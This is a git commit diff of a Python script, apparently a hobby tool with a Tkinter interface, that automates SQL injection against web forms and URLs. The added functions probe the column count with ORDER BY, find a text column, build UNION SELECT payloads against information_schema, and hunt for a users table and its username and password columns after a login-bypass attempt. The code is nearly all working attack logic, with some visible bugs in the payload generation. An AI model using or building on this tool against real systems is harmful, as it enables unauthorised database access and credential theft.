f0a4f33a3b4377ad3f55d075836e9e44618e4c6f
BigyanKalakheti <bigyan.kalakheti@gmail.com>
2024-02-29 12:24:41 +0545

    third commit

--- sqli.py
+++ sqli.py
@@ -44,16 +44,101 @@ def try_login(url, method,post_data):
         else:
             return False              
 
-def exploit_sqli_users_table(url, method, post_data):
-    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables #"
+def exploit_sqli_column_number(url,method,post_data=None):
+    if method == 'GET':
+        for i in range(1,50):
+            sql_payload = "'+order+by+%s--" %i
+            print(sql_payload)
+            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+            res = r.text
+            if r.status_code == 500:
+                if i-1 == 0:
+                    return "one column"
+                return i - 1
+            i = i + 1
+        return False
+    
+    elif method == 'POST':
+        for i in range(1,50):
+            sql_payload = "'+order+by+%s--" %i
+            post_data[list(post_data.keys())[0]] = sql_payload
+            print(sql_payload)
+            print(post_data)
+            r = requests.post(url ,data=post_data ,verify=False, proxies=proxies)
+            res = r.text
+            if r.status_code == 500:
+                if i-1 == 0:
+                    return "one column"
+                return i - 1
+            i = i + 1
+        return False
+
+
+def exploit_sqli_string_field(url, num_col,method,post_data=None):
+    if method == 'GET':
+        for i in range(1, num_col+1):
+            string = "'v2F6UA'"
+            payload_list = ['null'] * num_col
+            payload_list[i-1] = string
+            sql_payload = "' union select " + ','.join(payload_list) + "--"
+            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+            res = r.text
+            if string.strip('\'') in res:
+                return i
+        return False
+    
+    elif method == 'POST':
+        for i in range(1, num_col+1):
+            string = "'v2F6UA'"
+            payload_list = ['null'] * num_col
+            payload_list[i-1] = string
+            sql_payload = "' union select " + ','.join(payload_list) + "--"
+            post_data[list(post_data.keys())[0]] = sql_payload
+            print(sql_payload)
+            r = requests.post(url,data=post_data, verify=False, proxies=proxies)
+            res = r.text
+            if string.strip('\'') in res:
+                return i
+        return False
+
+
+def generate_sql_payload(num_columns, text_column_index,detail,users_table=None):
+    null_columns = ["NULL"] * num_columns
+    null_columns[text_column_index - 1] = detail
+    if detail == "table_name":
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.tables--"
+    elif detail == "column_name":
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " information_schema.columns WHERE table_name = '%s'--" % users_table
+    return sql_payload  
+
+def exploit_sqli_users_table(url, method, post_data=None):
+    print("[+] Figuring out number of columns...")
+    num_col = exploit_sqli_column_number(url,method,post_data)
+    print(num_col)
+    if num_col:
+        print("[+] The number of columns is " + str(num_col) + "." )
+        print("[+] Figuring out which column contains text...")
+        if num_col =="one column":
+            num_col=1
+            string_column = exploit_sqli_string_field(url, num_col,method,post_data)
+        string_column = exploit_sqli_string_field(url, num_col,method,post_data)
+        if string_column:
+            print("[+] The column that contains text is " + str(string_column) + ".")
+        else:
+            print("[-] We were not able to find a column that has a string data type.")
+
+    sql_payload = generate_sql_payload(num_col,string_column,"table_name")
+    print(sql_payload)
     res = perform_request(url, sql_payload, method, post_data)
     print(res)
     soup = BeautifulSoup(res.text, 'html.parser')
-    users_table = soup.find(text=re.compile('^USERS\_.*'))
-    return users_table
+    users_table = soup.find(text=re.compile('.*users.*'))
+    return users_table,num_col,string_column
 
-def exploit_sqli_users_columns(url, users_table, method='GET', post_data=None):
-    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % users_table
+
+
+def exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column):
+    sql_payload = generate_sql_payload(num_col,string_column,"table_name",users_table)
     res = perform_request(url, sql_payload, method, post_data)
     soup = BeautifulSoup(res.text, 'html.parser')
     username_column = soup.find(text=re.compile('.*USERNAME.*'))
@@ -78,22 +163,26 @@ def main():
         result_text.delete(1.0, tk.END)  # Clear previous results
 
         method = 'GET' if method_var.get() == 0 else 'POST'
-        data = post_data_entry.get() if method == 'POST' else None
-        post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
+        if method == 'POST':
+            data = post_data_entry.get() if method == 'POST' else None
+            post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
         if try_login_option.get():
             login_successful = try_login(url, method, post_data)
-        if login_successful[0]:
-            result_text.insert(tk.END, "[+] Login Successful!\n")
-            result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
-        else:
-            result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
-            return
+            if login_successful[0]:
+                result_text.insert(tk.END, "[+] Login Successful!\n")
+                result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
+            else:
+                result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
+                return
 
         print("Looking for the users table...")
-        users_table = exploit_sqli_users_table(url, method, post_data)
+        if method == 'GET':
+            users_table,num_col,string_column = exploit_sqli_users_table(url, method)
+        elif method == 'POST':
+            users_table,num_col,string_column = exploit_sqli_users_table(url, method,post_data)
         if users_table:
             result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
-            username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data)
+            username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
             if username_column and password_column:
                 result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
                 result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)
